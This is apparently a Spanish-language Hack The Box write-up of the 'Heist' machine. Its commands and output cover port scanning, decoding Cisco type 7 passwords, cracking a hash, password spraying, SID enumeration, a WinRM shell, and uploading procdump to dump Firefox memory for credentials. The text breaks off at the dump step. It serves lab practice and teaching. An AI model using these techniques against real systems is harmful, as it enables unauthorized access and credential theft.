---
layout: single
title: Heist - Hack The Box
excerpt: "En este post vamos a estar haciendo la maquina Heist de la plataforma de Hack The Box donde mediante hashes de Cisco Password 7 que crackeamos vamos a hacer un password spray para ver a que usuario pertenece vamos a estar usando impacket-lookupsid para descubrir nuevos usuarios y conectarnos con evil-wirnm ya que el usuario forma parte del grupo Remote Management Users y para la escalada de privilegios mediante strings vamos a analizar un volcado de un PID que esta corriendo Firefox donde las credenciales serán las del usuario Administrador"
date: 2024-04-13
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-heist/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:
  - Cisco Password Cracker
  - lookupsid.py
  - Firefox process
  - Information Leakage
---

## PortScan

- Comenzamos escaneando puertos y viendo sus tecnologías que corren en los puertos abiertos por el protocolo `TCP`.

| Parámetro       | Uso                                                                                                                                                                                                                                                                                                                                                                  |
| --------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| -p-             | Escanear todo el rango de puertos (65535) por el protocolo TCP.                                                                                                                                                                                                                                                                                                      |
| --open          | Solo queremos ver puertos abiertos.                                                                                                                                                                                                                                                                                                                                  |
| -sS             | TCP SYN Stealth, Nmap realiza un escaneo de tipo SYN, envía paquetes SYN (Synchronize) a los puertos de destinosi recibe un paquete SYN/ACK (Synchronize/Acknowledge), esto indica que el puerto está abierto. Si recibe un paquete RST (Reset), significa que el puerto está cerrado. Esta técnica es útil porque puede ayudar a evadir ciertos tipos de firewalls. |
| --min-rate 5000 | Vamos a emitir al menos 5000 paquetes por segundo para ir mucho mas rápido.                                                                                                                                                                                                                                                                                          |
| -vvv            | Para que nos reporte los puertos que vaya encontrando por la consola.                                                                                                                                                                                                                                                                                                |
| -n              | Para que no aplique resolución DNS.                                                                                                                                                                                                                                                                                                                                  |
| -Pn             | Esto es para indicarle que omita el descubrimiento de hosts.                                                                                                                                                                                                                                                                                                         |
| -oG             | Para exportar la salida en formato Greppable.                                                                                                                                                                                                                                                                                                                        |


```bash
➜  nmap nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.116.26 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-13 14:27 CST
Initiating SYN Stealth Scan at 14:27
Scanning 10.129.116.26 [65535 ports]
Discovered open port 49669/tcp on 10.129.116.26
Discovered open port 5985/tcp on 10.129.116.26
Discovered open port 80/tcp on 10.129.116.26
Discovered open port 135/tcp on 10.129.116.26
Discovered open port 445/tcp on 10.129.116.26
Increasing send delay for 10.129.116.26 from 0 to 5 due to 11 out of 22 dropped probes since last increase.
Completed SYN Stealth Scan at 14:27, 52.89s elapsed (65535 total ports)
Nmap scan report for 10.129.116.26
Host is up, received user-set (0.097s latency).
Scanned at 2024-04-13 14:27:02 CST for 53s
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127
```

- Ahora usamos la función `extractPorts` para copear los puertos abiertos a la `clipboard` y escanear los servicios que corren en los puertos de la maquina.

```bash
➜  nmap which extractPorts
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	cat extractPorts.tmp
	rm extractPorts.tmp
}
```

- La ejecutamos y nos copea los puertos.

```bash
➜  nmap extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.129.116.26
	[*] Open ports: 80,135,445,5985,49669

[*] Ports copied to clipboard
```

- Ahora seguimos con el escaneo de los servicios de los puertos abiertos.

| Uso                                                                                      | Párametro |
| ---------------------------------------------------------------------------------------- | --------- |
| Que nos reporte las tecnologías y servicios que están corriendo en los puertos abiertos. | -sCV      |
| Que no lo exporte a un archivo normal.                                                   | -oN       |

- Y listo

```bash
➜  nmap nmap -sCV -p80,135,445,5985,49669 10.129.116.26 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-13 14:31 CST
Nmap scan report for 10.129.116.26
Host is up (0.097s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-title: Support Login Page
|_Requested resource was login.php
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -4s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2024-04-13T20:32:40
|_  start_date: N/A
```

## Enumeración

- Con la herramienta `whatweb` vemos las tecnologías que esta usando en el puerto 80.

```ruby
➜  nmap whatweb http://10.129.116.26
http://10.129.116.26 [302 Found] Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.129.116.26], Microsoft-IIS[10.0], PHP[7.3.1], RedirectLocation[login.php], X-Powered-By[PHP/7.3.1]
http://10.129.116.26/login.php [200 OK] Bootstrap[3.3.7], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.129.116.26], JQuery[3.1.1], Microsoft-IIS[10.0], PHP[7.3.1], PasswordField[login_password], Script, Title[Support Login Page], X-Powered-By[PHP/7.3.1]
```

- Vemos que nos redirige a un panel de `login`.

<p align="center">
<img src="/assets/images/htb-writeup-heist/1.png">
</p>

- Si observamos en la parte de abajo nos dice `Login as guest` si damos `click` vemos que funciona correctamente.

<p align="center">
<img src="/assets/images/htb-writeup-heist/2.png">
</p>

- El usuario Hazard nos habla de que ah estado experimentando problemas con su `router cisco`.

<p align="center">
<img src="/assets/images/htb-writeup-heist/3.png">
</p>

- Si vemos el **Attachment** nos muestra el archivo de configuración que nos dice que el usuario **admin** estaba usando.

<p align="center">
<img src="/assets/images/htb-writeup-heist/4.png">
</p>

- Vemos que mencionan mucho el `password` 7.

```bash
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
```

- <https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html> podemos apoyarnos de ese recurso para poder ver las contraseñas en texto plano simplemente pasándole el hash `0242114B0E143F015F5D1E161713`.

<p align="center">
<img src="/assets/images/htb-writeup-heist/5.png">
</p>

- Esta es del otro hash.

<p align="center">
<img src="/assets/images/htb-writeup-heist/6.png">
</p>

- Podemos aplicar un `PasswordSpray` para probar las credenciales que tenemos y el usuario Hazard.

```bash
➜  content cat users.txt
admin
rout3r
hazard
```

- Si recordamos también nos dan un hash.

```bash
➜  content cat hash
$1$pdQG$o8nrSzsGXeaduXrjlvKc91
```

- Podemos usar `john` para crackearlo y añadirlo a nuestra lista para poder aplicar el `password spray`.

```bash
➜  content john -w:/usr/share/wordlists/rockyou.txt hash
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
stealth1agent    (?)
1g 0:00:00:32 DONE (2024-04-13 15:00) 0.03101g/s 108732p/s 108732c/s 108732C/s stealthy001..ste88dup
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

- Estas son las contraseñas que tenemos.

```bash
➜  content cat creds.txt
Q4)sJu\Y8qz*A3?d
$uperP@ssword
stealth1agent
```

- Vemos que tenemos credenciales validas para el usuario hazard.

```bash
➜  content crackmapexec smb 10.129.116.26 -u users.txt -p creds.txt --continue-on-success
SMB         10.129.116.26   445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\admin:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\admin:$uperP@ssword STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\admin:stealth1agent STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\rout3r:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      [-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\rout3r:stealth1agent STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\hazard:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\hazard:$uperP@ssword STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent
```

- Tenemos estos recursos compartidos a nivel de red pero no son interesantes.

```bash
➜  content crackmapexec smb 10.129.116.26 -u hazard -p stealth1agent --shares
SMB         10.129.116.26   445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB         10.129.116.26   445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent
SMB         10.129.116.26   445    SUPPORTDESK      [+] Enumerated shares
SMB         10.129.116.26   445    SUPPORTDESK      Share           Permissions     Remark
SMB         10.129.116.26   445    SUPPORTDESK      -----           -----------     ------
SMB         10.129.116.26   445    SUPPORTDESK      ADMIN$                          Remote Admin
SMB         10.129.116.26   445    SUPPORTDESK      C$                              Default share
SMB         10.129.116.26   445    SUPPORTDESK      IPC$            READ            Remote IPC
```

- Vamos a enumerar por `RPC` ya que el puerto esta abierto.

- Pero no podemos.

```bash
➜  content rpcclient -U "hazard%stealth1agent" 10.129.116.26
rpcclient $> enumdomusers
result was NT_STATUS_CONNECTION_DISCONNECTED
```

- Algo que podemos hacer es conectarnos al panel de `login` ya que tenemos credenciales validas.

<p align="center">
<img src="/assets/images/htb-writeup-heist/7.png">
</p>

- Nos piden un email pero a saber cual si probamos con el de la maquina no nos deja.

<p align="center">
<img src="/assets/images/htb-writeup-heist/8.png">
</p>

## Shell as Chase

- Bueno algo que podemos hacer es usar `lookupsid.py` con esto podemos enumerar mas usuarios validos a nivel de sistema a partir de sus SID correspondientes pero necesitamos el dominio de la maquina a si que vamos a ver cual es con la herramienta de `crackmapexec`.

```bash
➜  content crackmapexec smb 10.129.116.26
SMB         10.129.116.26   445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
```

- Y encontramos nuevos usuarios.

```bash
➜  content impacket-lookupsid SUPPORTDESK/hazard:stealth1agent@10.129.116.26
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Brute forcing SIDs at 10.129.116.26
[*] StringBinding ncacn_np:10.129.116.26[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)
```

- Vamos a ver si uno de los usuarios que tenemos reutiliza alguna contraseña de las que tenemos.

```bash
➜  content crackmapexec smb 10.129.116.26 -u users.txt -p creds.txt --continue-on-success
SMB         10.129.116.26   445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\admin:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      [-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         10.129.116.26   445    SUPPORTDESK      [-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\rout3r:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\rout3r:$uperP@ssword STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\rout3r:stealth1agent STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\hazard:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\hazard:$uperP@ssword STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\support:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\support:$uperP@ssword STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\support:stealth1agent STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      [+] SupportDesk\Chase:Q4)sJu\Y8qz*A3?d
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\Chase:$uperP@ssword STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\Chase:stealth1agent STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\Jason:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\Jason:$uperP@ssword STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\Jason:stealth1agent STATUS_LOGON_FAILURE
```

- El usuario Chase usa una contraseña que tenemos además el usuario forma parte del grupo `Remote Management Users`.

```bash
➜  content crackmapexec winrm 10.129.116.26 -u 'Chase' -p 'Q4)sJu\Y8qz*A3?d'
SMB         10.129.116.26   5985   SUPPORTDESK      [*] Windows 10.0 Build 17763 (name:SUPPORTDESK) (domain:SupportDesk)
HTTP        10.129.116.26   5985   SUPPORTDESK      [*] http://10.129.116.26:5985/wsman
WINRM       10.129.116.26   5985   SUPPORTDESK      [+] SupportDesk\Chase:Q4)sJu\Y8qz*A3?d (Pwn3d!)
```

- Ahora podemos usar `evil-winrm` para conectarnos.

```bash
➜  content evil-winrm -i 10.129.116.26 -u 'Chase' -p 'Q4)sJu\Y8qz*A3?d'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Chase\Documents> whoami
supportdesk\chase
```

# user flag

- Podemos leer la `user flag`.

```bash
*Evil-WinRM* PS C:\Users\Chase\Documents> type C:\Users\Chase\Desktop\user.txt
03b82a9b1533ba49d298214751e7bd51
```

## Escalada de privilegios

- No tenemos ningún privilegio interesante.

```bash
*Evil-WinRM* PS C:\Users\Chase\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\Chase\Documents>
```

- Vamos a ver los procesos que esta corriendo la maquina.

- Y vemos que esta corriendo el Firefox.

```bash
*Evil-WinRM* PS C:\Users\Chase\Documents> ps

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    467      18     2288       5428               364   0 csrss
    287      13     1896       5020               476   1 csrss
    357      15     3484      14528              4936   1 ctfmon
    253      14     3956      13344              3868   0 dllhost
    166       9     1868       9768       0.02   6492   1 dllhost
    617      32    30384      57840               956   1 dwm
   1494      58    23864      78872              5236   1 explorer
   1087      69   129340     206756       4.94   6240   1 firefox
    347      20    10204      38616       0.08   6348   1 firefox
    401      35    34804      93476       0.73   6580   1 firefox
    378      28    22008      58588       0.38   6788   1 firefox
    355      25    16512      38936       0.08   7044   1 firefox
     49       6     1496       3892               768   0 fontdrvhost
     49       6     1776       4636               776   1 fontdrvhost
      0       0       56          8                 0   0 Idle
    973      23     5820      14900               624   0 lsass
    223      13     2948      10200              3928   0 msdtc
      0      12      324      15144                88   0 Registry
    273      14     2988      14820              4792   1 RuntimeBroker
    144       8     1644       7540              5716   1 RuntimeBroker
    304      16     5596      16948              5840   1 RuntimeBroker
    664      32    19612      61404              5640   1 SearchUI
    541      11     4732       9448               608   0 services
    691      29    14984      52012              5516   1 ShellExperienceHost
    443      17     4928      24064              4976   1 sihost
     53       3      516       1156               264   0 smss
    471      22     5928      16200              2500   0 spoolsv
    308      20     9708      14372               328   0 svchost
    199      12     1964       9520               368   0 svchost
    223      11     2844      10948               592   0 svchost
    149       9     1700      11584               704   0 svchost
     85       5      888       3792               724   0 svchost
    861      20     7020      22312               748   0 svchost
    310      16    13188      15460               792   0 svchost
    864      16     5180      11684               856   0 svchost
    255      10     1992       7676               904   0 svchost
    127       7     1544       6220               964   0 svchost
    379      13    10864      14812               976   0 svchost
    337      16     4732      13572              1004   0 svchost
    140       7     1304       5688              1132   0 svchost
    127      17     3640       7492              1164   0 svchost
    184       9     1776       7548              1232   0 svchost
    230      12     2668      11276              1240   0 svchost
    154       7     1208       5616              1252   0 svchost
    429       9     2752       8824              1260   0 svchost
    216       9     2128       7588              1324   0 svchost
    170      10     1756       7940              1364   0 svchost
    249      15     3236       8564              1404   0 svchost
    304      12     2084       9000              1412   0 svchost
    366      17     5104      14212              1428   0 svchost
    347      14     4588      11828              1532   0 svchost
    191      12     2076      11936              1548   0 svchost
    163      10     2504       7424              1680   0 svchost
    167       9     2160       7552              1752   0 svchost
    323      10     2604       8420              1780   0 svchost
    408      32     9056      17164              1804   0 svchost
    194      11     1972       8136              1884   0 svchost
    209      11     2780      11948              2032   0 svchost
    238      11     2504       9720              2040   0 svchost
    338      18    14776      31468              2168   0 svchost
    465      17     3376      11856              2192   0 svchost
    166      12     3904      10788              2588   0 svchost
    179      22     2496       9844              2596   0 svchost
    460      19    11424      26096              2604   0 svchost
    261      13     2568       7880              2624   0 svchost
    396      16    11124      20352              2648   0 svchost
    133       9     1616       6548              2684   0 svchost
    136       8     1508       6144              2720   0 svchost
    205      11     2260       8324              2728   0 svchost
    126       7     1224       5340              2740   0 svchost
    238      15     4792      11824              2836   0 svchost
    209      12     1872       7448              2844   0 svchost
    169      10     2132      13248              2852   0 svchost
    263      19     3588      12100              2864   0 svchost
    441      62    14756      23396              2900   0 svchost
    193      15     6000      10032              2956   0 svchost
    383      23     3308      12232              3184   0 svchost
    163       9     3016       7600              3948   0 svchost
    255      14     3188      13832              4468   0 svchost
    171       9     1476       7224              4492   0 svchost
    167       9     4212      11848              4596   0 svchost
    189      12     2696      13352              4860   0 svchost
    230      12     3036      13592              4992   1 svchost
    369      18     5652      27096              5016   1 svchost
    254      13     3296      12508              5448   0 svchost
    122       7     1232       5600              6188   0 svchost
    115       7     1236       5356              7032   0 svchost
   1892       0      192         88                 4   0 System
    210      20     3900      12436              5052   1 taskhostw
    167      11     2900      10840              2764   0 VGAuthService
    136       9     1808       7408              2532   1 vm3dservice
    142       8     1688       6888              2772   0 vm3dservice
    383      22     9320      21796              2796   0 vmtoolsd
    236      18     5048      15216              4828   1 vmtoolsd
    242      21     5912      14768              6708   0 w3wp
    171      11     1448       6852               468   0 wininit
    282      13     2812      12796               532   1 winlogon
    349      16     8968      18376              4024   0 WmiPrvSE
    824      27    53908      69688       0.63   6012   0 wsmprovhost
```

- Podemos usar una herramienta <https://learn.microsoft.com/en-us/sysinternals/downloads/procdump> para realizar un volcado de un PID que le demos en este caso el de Firefox que analizaremos y ver las `strings` .

- Tenemos los `.exe` pero solo vamos a subir 1 ala maquina **procdump64.exe**.

```bash
➜  content 7z l Procdump.zip

7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20
 64-bit locale=C.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 731622 bytes (715 KiB)

Listing archive: Procdump.zip

--
Path = Procdump.zip
Type = zip
Physical Size = 731622

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2022-11-03 15:55:14 .....       791960       364222  procdump.exe
2022-11-03 15:55:14 .....       424856       196343  procdump64.exe
2022-11-03 15:55:14 .....       407952       167513  procdump64a.exe
2022-11-03 15:55:00 .....         7490         3120  Eula.txt
------------------- ----- ------------ ------------  ------------------------
2022-11-03 15:55:14            1632258       731198  4 files
```

- Ahora ya los descomprimimos.

```bash
➜  content unzip Procdump.zip
Archive:  Procdump.zip
  inflating: procdump.exe
  inflating: procdump64.exe
  inflating: procdump64a.exe
  inflating: Eula.txt
```

- Y lo subimos ala maquina.

```bash
*Evil-WinRM* PS C:\Users\Chase\Desktop> upload procdump64.exe

Info: Uploading /home/miguel/Hackthebox/Heist/content/procdump64.exe to C:\Users\Chase\Desktop\procdump64.exe

Data: 566472 bytes of 566472 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\Chase\Desktop> dir


    Directory: C:\Users\Chase\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/14/2024   3:07 AM         424856 procdump64.exe
-a----        4/22/2019   9:08 AM            121 todo.txt
-ar---        4/14/2024   1:56 AM             34 user.txt
```

- Necesitamos saber el PID para que funcione.

```bash
*Evil-WinRM* PS C:\Users\Chase\Desktop> ps | findstr firefox
   1083      69   135944     213292       5.03   6240   1 firefox
    347      20    10204      38616       0.08   6348   1 firefox
    401      34    32136      92488       0.78   6580   1 firefox
    378      28    22316      58980       0.38   6788   1 firefox
    355      25    16512      38936       0.08   7044   1 firefox
```

- Para hacerlo hacemos lo siguiente.

```bash
*Evil-WinRM* PS C:\Users\Chase\Desktop> .\procdump64.exe -accepteula

ProcDump v11.0 - Sysinternals process dump utility
Copyright (C) 2009-2022 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

Monitors a process and writes a dump file when the process exceeds the
specified criteria or has an exception.

Capture Usage:
   procdump.exe [-mm] [-ma] [-mt] [-mp] [-mc <Mask>] [-md <Callback_DLL>] [-mk]
                [-n <Count>]
                [-s <Seconds>]
                [-c|-cl <CPU_Usage> [-u]]
                [-m|-ml <Commit_Usage>]
                [-p|-pl <Counter> <Threshold>]
                [-h]
                [-e [1] [-g] [-b] [-ld] [-ud] [-ct] [-et]]
                [-l]
                [-t]
                [-f  <Include_Filter>, ...]
                [-fx <Exclude_Filter>, ...]
                [-dc <Comment>]
                [-o]
                [-r [1..5] [-a]]
                [-at <Timeout>]
                [-wer]
                [-64]
                {
                 {{[-w] <Process_Name> | <Service_Name> | <PID>} [<Dump_File> | <Dump_Folder>]}
                |
                 {-x <Dump_Folder> <Image_File> [Argument, ...]}
                }
Install Usage:
   procdump.exe -i [Dump_Folder]
                [-mm] [-ma] [-mt] [-mp] [-mc <Mask>] [-md <Callback_DLL>] [-mk]
                [-r]
                [-at <Timeout>]
                [-k]
                [-wer]
Uninstall Usage:
   procdump.exe -u

Dump Types:
   -mm     Write a 'Mini' dump file. (default)
           - Includes directly and indirectly referenced memory (stacks and what they reference).
           - Includes all metadata (Process, Thread, Module, Handle, Address Space, etc.).
   -ma     Write a 'Full' dump file.
           - Includes all memory (Image, Mapped and Private).
           - Includes all metadata (Process, Thread, Module, Handle, Address Space, etc.).
   -mt     Write a 'Triage' dump file.
           - Includes directly referenced memory (stacks).
           - Includes limited metadata (Process, Thread, Module and Handle).
           - Removal of sensitive information is attempted but not guaranteed.
   -mp     Write a 'MiniPlus' dump file.
           - Includes all Private memory and all Read/Write Image or Mapped memory.
           - Includes all metadata (Process, Thread, Module, Handle, Address Space, etc.).
           - To minimize size, the largest Private memory area over 512MB is excluded.
             A memory area is defined as the sum of same-sized memory allocations.
             The dump is as detailed as a Full dump but 10%-75% the size.
           - Note: CLR processes are dumped as Full (-ma) due to debugging limitations.
   -mc     Write a 'Custom' dump file.
           - Includes the memory and metadata defined by the specified MINIDUMP_TYPE mask (Hex).
   -md     Write a 'Callback' dump file.
           - Includes the memory defined by the MiniDumpWriteDump callback routine
             named MiniDumpCallbackRoutine of the specified DLL.
           - Includes all metadata (Process, Thread, Module, Handle, Address Space, etc.).
   -mk     Also write a 'Kernel' dump file.
           - Includes the kernel stacks of the threads in the process.
           - OS doesn't support a kernel dump (-mk) when using a clone (-r).
           - When using multiple dump sizes, a kernel dump is taken for each dump size.

Conditions:
   -a      Avoid outage. Requires -r. If the trigger will cause the target
           to suspend for a prolonged time due to an exceeded concurrent
           dump limit, the trigger will be skipped.
   -at     Avoid outage at Timeout. Cancel the trigger's collection at N seconds.
   -b      Treat debug breakpoints as exceptions (otherwise ignore them).
   -c      CPU threshold above which to create a dump of the process.
   -cl     CPU threshold below which to create a dump of the process.
   -dc     Add the specified string to the generated Dump Comment.
   -e      Write a dump when the process encounters an unhandled exception.
           Include the 1 to create dump on first chance exceptions.
           Add -ld to create a dump when a DLL (module) is loaded (filtering applies).
           Add -ud to create a dump when a DLL (module) is unloaded (filtering applies).
           Add -ct to create a dump when a thread is created.
           Add -et to create a dump when a thread exits.
   -f      Filter (include) on the content of exceptions, debug logging and filename at DLL load/unload.
           Wildcards (*) are supported.
   -fx     Filter (exclude) on the content of exceptions, debug logging and filename at DLL load/unload.
           Wildcards (*) are supported.
   -g      Run as a native debugger in a managed process (no interop).
   -h      Write dump if process has a hung window (does not respond to
           window messages for at least 5 seconds).
   -k      Kill the process after cloning (-r), or at end of dump collection.
   -l      Display the debug logging of the process.
   -m      Memory commit threshold in MB at which to create a dump.
   -ml     Trigger when memory commit drops below specified MB value.
   -n      Number of dumps to write before exiting.
   -o      Overwrite an existing dump file.
   -p      Trigger when the Performance Counter is at, or exceeds, the specified Threshold.
           Some Counters and/or Instance Names can be case-sensitive.
   -pl     Trigger when the Performance Counter falls below the specified Threshold.
   -r      Dump using a clone. Concurrent limit is optional (default 1, max 5).
           OS doesn't support a kernel dump (-mk) when using a clone (-r).
           CAUTION: a high concurrency value may impact system performance.
           - Windows 7   : Uses Reflection. OS doesn't support -e.
           - Windows 8.0 : Uses Reflection. OS doesn't support -e.
           - Windows 8.1+: Uses PSS. All trigger types are supported.
   -s      Consecutive seconds before dump is written (default is 10).
   -t      Write a dump when the process terminates.
   -u      Treat CPU usage relative to a single core (used with -c).
   -w      Wait for the specified process to launch if it's not running.
   -wer    Queue the (largest) dump to Windows Error Reporting.
   -x      Launch the specified image with optional arguments.
           If it is a Store Application or Package, ProcDump will start
           on the next activation (only).
   -64     By default ProcDump will capture a 32-bit dump of a 32-bit process
           when running on 64-bit Windows. This option overrides to create a
           64-bit dump. Only use for WOW64 subsystem debugging.

Install/Uninstall:
   -i      Install ProcDump as the AeDebug postmortem debugger.
           Only -mm, -ma, -mt, -mp, -mc, -md and -r are supported as additional options.
           Uninstall (-u only) restores the previous configuration.
   -u      As the only option, Uninstalls ProcDump as the AeDebug postmortem debugger.

License Agreement:
   Use the -accepteula command line option to automatically accept the
   Sysinternals license agreement.

Automated Termination:
   -cancel <Target Process PID>
           Using this option or setting an event with the name "ProcDump-<PID>"
           is the same as typing Ctrl+C to gracefully terminate ProcDump.
           Graceful termination ensures the process is resumed if a capture is active.
           The cancellation applies to ALL ProcDump instances monitoring the process.

Filename:
   Default dump filename: PROCESSNAME_YYMMDD_HHMMSS.dmp
   The following substitutions are supported:
           PROCESSNAME   Process Name
           PID           Process ID
           EXCEPTIONCODE Exception Code
           YYMMDD        Year/Month/Day
           HHMMSS        Hour/Minute/Second

Examples:
   Use -? -e to see example command lines.
```

- Ahora le pasamos los parámetros y el PID.

```bash
*Evil-WinRM* PS C:\Users\Chase\Desktop> .\procdump64.exe -accepteula -ma 6240

ProcDump v11.0 - Sysinternals process dump utility
Copyright (C) 2009-2022 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

